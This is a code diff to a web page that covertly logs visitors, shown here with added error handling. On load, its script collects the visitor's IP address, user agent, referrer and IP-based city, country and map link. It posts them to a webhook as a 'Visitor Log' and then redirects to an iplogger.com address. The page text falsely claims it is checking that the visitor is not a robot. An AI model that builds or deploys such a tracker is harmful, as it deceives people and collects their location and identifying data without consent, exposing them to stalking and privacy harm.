@@ -14,51 +14,55 @@
             let city = "N/A";
             let country = "N/A";
 
-            // Get public IP address
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ipAddress = ipData.ip;
+            try {
+                // Get public IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
 
-            // Get approximate location based on IP
-            const ipLocationResponse = await fetch(`http://ip-api.com/json/${ipAddress}`);
-            const ipLocationData = await ipLocationResponse.json();
-            city = ipLocationData.city;
-            country = ipLocationData.country;
-            const ipLatitude = ipLocationData.lat;
-            const ipLongitude = ipLocationData.lon;
-            const ipLocationLink = `https://www.google.com/maps?q=${ipLatitude},${ipLongitude}`;
+                // Get approximate location based on IP using ipinfo.io
+                const locationResponse = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+                const locationData = await locationResponse.json();
+                city = locationData.city || "N/A";
+                country = locationData.country || "N/A";
+                const ipLocationLink = `https://www.google.com/maps?q=${locationData.loc}`;
 
-            const logMessage = {
-                content: "@everyone",
-                username: "Logger",
-                embeds: [{
-                    title: "Visitor Log",
-                    color: 15158332,
-                    fields: [
-                        { name: "User Agent", value: userAgent, inline: false },
-                        { name: "IP Address", value: ipAddress, inline: false },
-                        { name: "Referrer", value: referrer, inline: false },
-                        { name: "Timestamp", value: timestamp, inline: false },
-                        { name: "City", value: city, inline: false },
-                        { name: "Country", value: country, inline: false },
-                        { name: "Approximate Location (IP)", value: ipLocationLink, inline: false }
-                    ]
-                }]
-            };
+                const logMessage = {
+                    content: "@everyone",
+                    username: "Logger",
+                    embeds: [{
+                        title: "Visitor Log",
+                        color: 15158332,
+                        fields: [
+                            { name: "User Agent", value: userAgent, inline: false },
+                            { name: "IP Address", value: ipAddress, inline: false },
+                            { name: "Referrer", value: referrer, inline: false },
+                            { name: "Timestamp", value: timestamp, inline: false },
+                            { name: "City", value: city, inline: false },
+                            { name: "Country", value: country, inline: false },
+                            { name: "Approximate Location (IP)", value: ipLocationLink, inline: false }
+                        ]
+                    }]
+                };
 
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(logMessage)
-            });
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(logMessage)
+                });
 
-            window.location.href = "https://iplogger.com/2lY8J3";
+                window.location.href = "https://iplogger.com/2lY8J3";
+            } catch (error) {
+                console.error("Error fetching location:", error);
+                // Handle errors, e.g., redirect to a default page
+                window.location.href = "https://example.com/error";
+            }
         }
     </script>
 </head>
-    <body onload="logAndRedirect()">
-        <p>Estamos esperando-lhe aceitar a localização para provar-mos que não é um robô...</p>
-    </body>
+<body onload="logAndRedirect()">
+    <p>Estamos esperando-lhe aceitar a localização para provar-mos que não é um robô...</p>
+</body>
 </html>
